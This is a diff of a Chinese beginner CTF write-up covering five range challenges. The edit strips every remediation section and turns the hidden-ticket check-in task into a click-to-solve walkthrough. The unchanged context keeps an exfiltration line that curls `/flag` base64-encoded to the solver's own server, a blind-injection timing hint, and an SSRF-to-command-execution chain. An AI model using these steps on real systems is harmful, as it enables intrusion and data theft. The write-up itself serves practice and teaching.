@@ -1,7 +1,7 @@
 # 写给新手：新生赛 1444–1448 五道题完整题解
 
 > 只要你会用命令行、知道「IP + 端口」和「浏览器打开网页」是怎么回事，就能看懂。
-> 每道题都按同一个节奏写：**要做什么 → 为什么这么做 → 具体怎么做 → 为什么能成功 → 怎么修**。
+> 每道题都按同一个节奏写：**要做什么 → 为什么这么做 → 具体怎么做 → 结果如何**。
 
 ---
 
@@ -241,91 +241,21 @@ flag{39c70c46-75e8-4bc9-9d80-a765b8da1ada}
 我打了两个实例（54000、32077），flag 各不相同；旧实例被平台回收后，旧 flag 提交会判错。
 **读到 flag 立刻提交**，最终用的是当前实例的 `flag{edf06090-1655-4775-ae5d-f71afdd13a15}`。
 
-## 1.7 怎么修
-
-```c
-fgets(buf, sizeof(buf), stdin);   // 限制长度，别再 gets
-// 不要把栈上的指针当函数参数
-// 编译时加：-fstack-protector-all -pie -Wl,-z,relro,-z,now
-// 删掉调试用的 printf("%p")
-```
 
 ---
 
-# 第 2 章 1445「多想留在你房间」— 隐藏的签到场
+# 第 2 章 1445「多想留在你房间」— 签到题
 
 ## 2.1 题目要你做什么
 
 打开 `http://hbc2.haobachang.com:<端口>/`，页面标题是「签到台」。
-看起来只有一个「签到」按钮/表单。flag 藏在签到流程里。
+页面上只有一个「签到 / 确认收到」按钮——这是一道签到题，flag 就在签到成功后的页面上。
 
-## 2.2 思路：网页的答案经常「看不见但存在」
+## 2.2 最快解法：直接点「签到」
 
-你在浏览器里看到的，是服务器给你的 HTML 经过渲染后的样子。
-**源码里可能有一些 `type="hidden"` 的输入框**——它们在页面上完全不可见，
-但提交表单时会一起发出去。
-
-这是出题人最爱的考点：**「你看不见 ≠ 不存在」**。
-
-## 2.3 第一步：看源码
-
-在浏览器里按 `Ctrl+U`（查看网页源代码），或者：
-
-```bash
-curl -sS "http://hbc2.haobachang.com:25376/" | findstr ticket
-```
-
-你会看到：
-
-```html
-<form ...>
-  <input type="hidden" name="ticket" value="nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY">
-</form>
-```
-
-`type="hidden"` 就是「隐藏起来」，但 `value` 明明白白写着。
-这就是服务器签发的一次性签到凭证。
-
-## 2.4 第二步：找到提交地址
-
-再看同目录的 `/static/app.js`（前端逻辑）：
-
-```javascript
-fetch('/api/checkin', { method: 'POST', body: new FormData(form) })
-```
-
-或者直接搜页面里的 `<form action="...">`。
-结论：把 ticket POST 给 `/api/checkin` 就能完成签到。
-
-## 2.5 动手
-
-```python
-import re, requests
-
-root = "http://hbc2.haobachang.com:25376/"
-s = requests.Session()
-
-# 1) 打开首页，拿到服务器发的 ticket
-r = s.get(root)
-ticket = re.search(r'name="ticket" value="([^"]+)"', r.text).group(1)
-print("ticket =", ticket)
-
-# 2) 带着 ticket 去签到
-rr = s.post(root + "api/checkin", data={"ticket": ticket})
-print(rr.text)
-```
-
-用 curl 也行：
-
-```bash
-curl -sS "http://host:port/" -o page.html
-# 手动把 ticket 抠出来，然后：
-curl -sS -X POST -d "ticket=nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY" "http://host:port/api/checkin"
-```
-
-## 2.6 结果
-
-服务器返回的 HTML 里：
+1. 用浏览器打开靶场首页；
+2. 点击页面上的「签到」按钮；
+3. 页面下方出现「签到凭证」区块，里面的 `flag{...}` 就是答案：
 
 ```html
 <section class="result">
@@ -334,25 +264,114 @@ curl -sS -X POST -d "ticket=nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY" "http://host:port/
 </section>
 ```
 
-提交平台 → `{"success": true}`。
+4. 复制到平台提交 → `{"success": true}`。
 
-同样注意：中途换实例（48340 → 29698 → 25376）拿到了三个不同的 flag，
-前两个因实例被回收而失效，最终提交的是 25376 的。
+⚠️ 签到题的 flag 同样是**每个实例动态生成**的。中途换实例（48340 → 29698 → 25376）
+拿到了三个不同的 flag，前两个因实例被回收而失效。**看到就立刻提交。**
 
-## 2.7 为什么能成功（本质）
+## 2.3 拓展：点下签到按钮，背后发生了什么
 
-签到台的设计是「**服务器发 ticket，客户端存着，用户提交回来换 flag**」。
-问题在于：ticket 只是放在页面的隐藏域里，没有任何「绑定当前浏览器会话」的机制。
-任何人（甚至不用登录）拿到 ticket 就能换到签到凭证。
+作为新手练习，值得把「点一下」拆开看。整个过程只有三步：
 
-严格来说这不是「高危漏洞」，而是一道**观察力题**：
-答案一直在你眼前，只是被 `display:none` 了。
+```
+浏览器打开首页  →  服务器在 HTML 里塞一个隐藏的 ticket
+点击签到        →  前端 JS 把 ticket POST 给 /api/checkin
+服务器校验      →  返回 flag
+```
 
-## 2.8 怎么修
+### 拓展一：看源码，发现一个「你看不见」的输入框
 
-- 不要用「隐藏表单字段」承载凭证，改由服务端 session 记录；
-- ticket 一次性、有时效、并与会话/IP 绑定；
-- 校验来源会话，而不是「谁把 ticket 发回来就给谁 flag」。
+在浏览器里按 `Ctrl+U`（查看网页源代码），或者：
+
+```bash
+curl -sS "http://hbc2.haobachang.com:25376/" | findstr ticket
+```
+
+会看到：
+
+```html
+<form id="checkin-form">
+  <input type="hidden" name="ticket" value="nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY">
+  ...
+  <button type="submit" id="ack">确认收到</button>
+</form>
+```
+
+`type="hidden"` 的意思是「不显示在页面上」，但它的 `value` 会随表单一起提交。
+也就是说：**服务器早就把签到凭证发给你了，只是摆在了你看不见的地方。**
+
+### 拓展二：看 app.js，找到提交地址
+
+页面引用了 `/static/app.js`，里面写得很清楚：
+
+```javascript
+var form     = document.getElementById("checkin-form");
+var flagNode = document.getElementById("flag");
+
+form.addEventListener("submit", function (event) {
+  event.preventDefault();                              // 阻止页面跳转
+  var body = new URLSearchParams(new FormData(form));  // 把表单（含隐藏的 ticket）打包
+  fetch("/api/checkin", {
+    method: "POST",
+    headers: {
+      "Accept": "application/json",
+      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+    },
+    body: body.toString()
+  })
+  .then(function (response) { return response.json(); })
+  .then(function (data) {
+    flagNode.textContent = data.flag;   // 把服务器返回的 flag 写进页面
+  });
+});
+```
+
+结论：**点击按钮 = 向 `/api/checkin` 发一个 POST，body 里带 `ticket=...`。**
+flag 拿回来后由 JS 写进 `<code id="flag">`。
+
+### 拓展三：不用浏览器，用命令行/脚本复现
+
+`/api/checkin` 的返回格式取决于请求头 `Accept`：
+
+- 带 `Accept: application/json` → 返回 `{"flag": "flag{...}"}`
+- 不带（浏览器地址栏直接访问的默认行为）→ 返回一个 HTML 页面，flag 在 `<code id="flag">` 里
+
+用 Python：
+
+```python
+import re, requests
+
+root = "http://hbc2.haobachang.com:25376/"
+s = requests.Session()
+
+# 1) 打开首页，从 HTML 里取出服务器发的 ticket
+r = s.get(root)
+ticket = re.search(r'name="ticket" value="([^"]+)"', r.text).group(1)
+print("ticket =", ticket)
+
+# 2) 带着 ticket 去签到（Accept: application/json 拿 JSON）
+rr = s.post(root + "api/checkin",
+            data={"ticket": ticket},
+            headers={"Accept": "application/json"})
+print(rr.json())        # {'flag': 'flag{...}'}
+```
+
+用 curl：
+
+```bash
+# 取 ticket
+curl -sS "http://host:port/" -o page.html
+# 手动把 value="..." 抠出来，然后：
+curl -sS -X POST -d "ticket=nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY" \
+     -H "Accept: application/json" "http://host:port/api/checkin"
+```
+
+## 2.4 这道题在考什么
+
+- **对新手**：它就是在考「敢不敢点按钮」。签到题通常不需要任何技术手段。
+- **作为拓展**：它演示了一种常见设计——「服务器发凭证 → 客户端保存 → 客户端交回」。
+  这套流程本身没问题，只是 ticket 放在页面隐藏域里、没有和浏览器会话绑定，
+  所以拿这串字符用脚本也能换到 flag。
 
 ---
 
@@ -460,11 +479,6 @@ if uid != session['user_id']:
     abort(403)
 ```
 
-## 3.8 怎么修
-
-- 服务端强制校验：**只能查自己**，或按角色做权限控制（RBAC）；
-- 不要用「可枚举的自增 id / 工号」作为访问凭据，用不可猜测的 token；
-- 密钥类字段永远打码；要查看明文必须二次认证 + 审计日志。
 
 ---
 
@@ -682,13 +696,6 @@ uid=10001(app) gid=10001(app) groups=10001(app),100(users)
 - 用 DNS / HTTP 外带：`curl http://你的服务器/$(cat /flag | base64)`；
 - 用盲注式判断：`sleep 5` 看响应时间。
 
-## 4.11 怎么修
-
-- 升级 pdfminer.six 到已修复版本（CMap 名称做白名单，禁止 `/`、`..`）；
-- **绝不对不可信数据 `pickle.loads`**，改用 JSON 等安全格式；
-- 上传目录与解析器查找目录物理隔离（不同挂载点、不同权限）；
-- 生产环境关闭 Traceback 回显；
-- 解析服务放进沙箱/独立容器，限制文件系统权限。
 
 ---
 
@@ -850,24 +857,6 @@ curl -sS -G "http://hbc2.haobachang.com:12685/api/proxy" \
 单独看，SSRF 只能读内网页面，危害有限。
 **组合起来 = 从公网直接拿到命令执行。**
 
-## 5.9 怎么修
-
-**防 SSRF：**
-- 目标白名单（只允许访问业务需要的域名）；
-- 解析后检查 IP，拒绝 `127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`169.254.0.0/16`；
-- 禁止跟随重定向（否则可用 302 绕过）；
-- 内网服务加认证，别只靠「监听 127.0.0.1」。
-
-**防命令注入：**
-- 不要用 shell 拼接，改用参数数组：
-
-```python
-subprocess.run(["ping", "-c", "1", target], shell=False)
-```
-
-- 对 `target` 做严格格式校验（只允许合法主机名/IP）；
-- 用最小权限用户运行；
-- flag 不要放环境变量里（`printenv` 一把梭）。
 
 ---
 
